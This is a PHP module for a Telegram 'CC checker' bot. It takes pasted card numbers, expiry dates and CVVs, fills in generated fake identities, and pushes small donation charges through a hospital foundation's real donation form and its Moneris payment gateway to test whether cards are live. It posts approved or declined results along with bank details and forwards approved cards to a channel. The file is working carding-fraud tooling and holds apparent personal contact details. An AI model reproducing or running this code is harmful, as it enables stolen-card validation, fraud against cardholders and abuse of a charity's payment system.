<?php

/*

///==[Stripe CC Checker Commands]==///

/ss creditcard - Checks the Credit Card

*/


include __DIR__."/../config/config.php";
include __DIR__."/../config/variables.php";
include_once __DIR__."/../functions/bot.php";
include_once __DIR__."/../functions/db.php";
include_once __DIR__."/../functions/functions.php";
include("moneris_error_codes.php");
$response = "";
////////////====[MUTE]====////////////
if(strpos($message, "/aa") === 0 || strpos($message, "!aa") === 0 || strpos($message, ".aa") === 0){
    $cookie = randomString();
    $trans_completed = false;
    $tries = 0;
    $limit = 6;
//    while ($trans_completed == false && $tries < $limit ||strpos($response, 'Gateway Rejected: risk_threshold!')) {
        $tries = $tries + 1;
        $antispam = antispamCheck($userId);
        $isPremium = get_prem_info($userId);
        addUser($userId);
        if ($antispam != False && $isPremium == "no"){
            bot('sendmessage', [
                'chat_id' => $chat_id,
                'text' => "[<u>ANTI SPAM</u>] Try again after <b>$antispam</b>s.",
                'parse_mode' => 'html',
                'reply_to_message_id' => $message_id
            ]);
            return;

        } else {
            $messageidtoedit1 = bot('sendmessage', [
                'chat_id' => $chat_id,
                'text' => "<b>Wait for Result...</b>",
                'parse_mode' => 'html',
                'reply_to_message_id' => $message_id

            ]);

            $messageidtoedit = capture(json_encode($messageidtoedit1), '"message_id":', ',');
            $lista = substr($message, 4);

            if (preg_match_all("/(\d{15})[\/\s:|]*?(\d\d)[\/\s|]*?(\d{2,4})[\/\s|-]*?(\d{4})/", $lista, $matches)||preg_match_all("/(\d{16})[\/\s:|]*?(\d\d)[\/\s|]*?(\d{2,4})[\/\s|-]*?(\d{3})/", $lista, $matches)){
                $creditcard = $matches[0][0];
                $cc = multiexplode(array(":", "|", "/", " "), $creditcard)[0];
                $mm = multiexplode(array(":", "|", "/", " "), $creditcard)[1];
                $yy = multiexplode(array(":", "|", "/", " "), $creditcard)[2];
                $cvv = multiexplode(array(":", "|", "/", " "), $creditcard)[3];
                $yy1 = substr($yy, 2, 2);
                $bin = substr($cc, 0, 6);
                $cbin = substr($cc, 0, 1);
                ###CHECKER PART###
                $randomShits = file_get_contents('https://namegenerator.in/assets/refresh.php?location=united-states');
                $data = json_decode($randomShits, true);
                $fname = explode(" ", $data['name'])[0];
                $lname = explode(" ", $data['name'])[1];
                $email = $data['email']['address'];
                $street = $data['street1'];
                $local = GetStr($randomShits, '"street2":', ',"phone"');
                $city = GetStr($local, '"', ',');
                $state = GetStr($local, ', ', ' ');
                $phone = str_replace("-", "", $data['phone']);
                $postcode = GetStr($local, "$state", '"');


                $binlist = json_decode(fbankinfo($bin), true);
                $ccbank = $binlist['Bank'];
                $ccvendor = $binlist['Vendor'];
                $cctype = $binlist['Bank_Info'];
                $cc_country = $binlist['Country'];
                $abn = $binlist['Abn'];
                $cc_emoji = $binlist['emoji'];

                $zip = rand(90010,94000);
                if($cbin == 5){
                    $cbin = 'mastercard';
                }
                else if($cbin == 4){
                    $cbin = 'visa';
                }

                /////////////////////==========[Unavailable if empty]==========////////////////


                $cookie = randomString();
                $str = substr(randomString(), 0, 7);

                $page =  cURL(
                    "https://www.stpaulshospital.org/foundation/donate/donate.php",
                    $headers = [
                        'Origin: https://www.stpaulshospital.org',
                        'Content-Type: application/x-www-form-urlencoded',
                        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36',
                        'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                        'Referer: https://www.stpaulshospital.org/foundation/donate/donate.php',
                    ],
                    'cust_id=SPH%2BDonation%2BForm&email=greatmarsh0928%40gmail.com&charge_total=10.00&rvarWPhone=&bill_country=Canada&rvarProvOther=&rvarNameM=&rvarDonorType=individual&rvarRecTitle=rvarTitle&rvarRecName=Marsh%2BGamboa&rvarDontRec=&rvarDirectTo=area_of_need&rvarDTMorH=memory&rvarDTName=&rvarDTOccass=&rvarDTAckN=Marsh%2BGamboa&rvarDTAckA=2380%2BCollege%2BStreet&rvarDTAckC=NORCROSS%2B-%2B30071&rvarDTAckP=Alabama&rvarDTAckPC=30071&rvarWhatLed=&rvarHowHear=&rvarComments=&doRecur=0&recurUnit=month&recurStartDate=&recurNum=60&recurStartNow=true&recurPeriod=1&recurAmount=0.00&donation_type=individual&bill_first_name=Marsh&bill_middle_name=&bill_last_name=Gamboa&bill_company_name=&title_recognition=rvarTitle&recognition_name=Marsh%2BGamboa&bill_address_one=2380%2BCollege%2BStreet&bill_city=NORCROSS%2B-%2B30071&bill_state_or_province=British_Columbia&bill_state_or_province_other=Singapore&bill_postal_code=30071&bill_phone=14043533823&donor_workphone=&donor_email=greatmarsh0928%40gmail.com&donor_emailconfirm=greatmarsh0928%40gmail.com&donation_amount=10.00&interval=&direct_gift_to=area_of_need&direct_gift_to_other=&memory_honour=memory&memory_honour_name=&occasion=&acknowledgement_name=Marsh%2BGamboa&acknowledgement_address=2380%2BCollege%2BStreet&acknowledgement_city=NORCROSS%2B-%2B30071&acknowledgement_province=Alabama&acknowledgement_postalcode=30071&what_led_gift=&what_led_gift_other=&hear_of_us=&hear_of_us_other=&send_comments=',
                    "POST",
                    1,
                    $cookie
                );  $TICKET = GetStr($page, 'name="ticket" type="hidden" value="' , '"');
                $hpp_id = GetStr($page, 'name="hpp_id" type="hidden" value="' , '"');

                $INDEX =  cURL(
                    "https://www3.moneris.com/HPPDP/index.php",
                    $headers = [
                        'Origin: https://www.stpaulshospital.org',
                        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36',
                        'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                        'Referer: https://www.stpaulshospital.org/foundation/donate/donate.php',
                    ],
                    array('hpp_id' => $hpp_id,'hpp_preload' => '','ticket' => $TICKET),
                    "POST",
                    1,
                    $cookie
                );

                echo $execute =  cURL(
                    "https://www3.moneris.com/HPPDP/hprequest.php",
                    $headers = [
                        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36',
                        'Content-type: application/x-www-form-urlencoded;charset=UTF-8',
                        'Accept: */*',
                        'Origin: https://www3.moneris.com',
                        'Referer: https://www3.moneris.com/HPPDP/index.php',
                    ],
                    "hpp_id=R3S9V00550&hpp_ticket=$TICKET&pan=$cc&pan_mm=$mm&pan_yy=$yy1&pan_cvd=111&cardholder=Absolom Sylvester&avs_str_num=125&avs_str_name=Centralavenue&avs_zip_code=30071&avs_po_box_addr=&doTransaction=cc_purchase",
                    "POST",
                    1,
                    $cookie
                );
                $respo = GetStr($execute, 'Code(' , ')');
                $response = strtoupper($monerisErrorTable[$respo]);

                $time = rand(10, 30);
                if(strpos($execute, '"success":"true"') || $respo == '481' || $respo == '000') {
                    addTotal();
                    addUserTotal($userId);
                    addCVV();
                    addUserCVV($userId);
                    addCCN();
                    addUserCCN($userId);
                    bot('editMessageText', [
                        'chat_id' => $chat_id,
                        'message_id' => $messageidtoedit,
                        'text' => "<b>APPROVED ✅ 
<b>Card -»</b> <code>$lista</code>
Response -» Approved
Addional Response -» $response
Type -» CVV 
Gateway -» NON-VBV AUTH
Time -» <b>$time</b><b>s</b>
------- Bin Info -------</b>
<b>Bank -»</b> $ccbank
<b>Brand -»</b> $ccvendor
<b>Type -»</b> $cctype
<b>Country -»</b> $cc_country($abn) $cc_emoji 
<b>----------------------------</b>

<b>Checked By <a href='tg://user?id=$userId'>$firstname</a></b>",
                        'parse_mode' => 'html',
                        'disable_web_page_preview' => 'true'

                    ]);copyLogs("@payamansoyccn",$chat_id,$messageidtoedit);$trans_completed = true;

                }else if(strpos($execute, '"error":"<li>Transaction has been declined.')) {
                    addTotal();
                    addUserTotal($userId);
                    bot('editMessageText', [
                        'chat_id' => $chat_id,
                        'message_id' => $messageidtoedit,
                        'text' => "<b>DECLINED ❌ 
<b>Card -»</b> <code>$lista</code>
Response -» $response ($respo)
Type -» CVV 
Gateway -» NON-VBV AUTH
Time -» <b>$time</b><b>s</b>
------- Bin Info -------</b>
<b>Bank -»</b> $ccbank
<b>Brand -»</b> $ccvendor
<b>Type -»</b> $cctype
<b>Country -»</b> $cc_country($abn) $cc_emoji 
<b>----------------------------</b>

<b>Checked By <a href='tg://user?id=$userId'>$firstname</a></b>",
                        'parse_mode' => 'html',
                        'disable_web_page_preview' => 'true'

                    ]);$trans_completed = true;
                }else if(strpos($execute, '"doVbv":"true"')) {
                    addTotal();
                    addUserTotal($userId);
                    bot('editMessageText', [
                        'chat_id' => $chat_id,
                        'message_id' => $messageidtoedit,
                        'text' => "<b>DECLINED ❌ 
<b>Card -»</b> <code>$lista</code>
Response -» VBV CARD NOT ACCEPTED
Type -» CVV 
Gateway -» NON-VBV AUTH
Time -» <b>$time</b><b>s</b>
------- Bin Info -------</b>
<b>Bank -»</b> $ccbank
<b>Brand -»</b> $ccvendor
<b>Type -»</b> $cctype
<b>Country -»</b> $cc_country($abn) $cc_emoji 
<b>----------------------------</b>

<b>Checked By <a href='tg://user?id=$userId'>$firstname</a></b>",
                        'parse_mode' => 'html',
                        'disable_web_page_preview' => 'true'

                    ]);$trans_completed = true;
                } else {
                    addTotal();
                    addUserTotal($userId);
                    bot('editMessageText', [
                        'chat_id' => $chat_id,
                        'message_id' => $messageidtoedit,
                        'text' => "<b>ERROR ❌ 
<b>Card -»</b> <code>$lista</code>
Response -» TRY AGAIN
Type -» CVV 
Gateway -» NON-VBV AUTH
Time -» <b>$time</b><b>s</b>
------- Bin Info -------</b>
<b>Bank -»</b> $ccbank
<b>Brand -»</b> $ccvendor
<b>Type -»</b> $cctype
<b>Country -»</b> $cc_country($abn) $cc_emoji 
<b>----------------------------</b>

<b>Checked By <a href='tg://user?id=$userId'>$firstname</a></b>",
                        'parse_mode' => 'html',
                        'disable_web_page_preview' => 'true'

                    ]);$trans_completed = true;
                }

            } else {
                bot('editMessageText', [
                    'chat_id' => $chat_id,
                    'message_id' => $messageidtoedit,
                    'text' => "<b>INVALID FORMAT: (cmd) XXXXXXXXXXXXXXXXXX|XX|XXXX|XXX</b>",
                    'parse_mode' => 'html', 'disable_web_page_preview' => 'true'

                ]);$confirm_method = true;
            }
        }

    }



?>
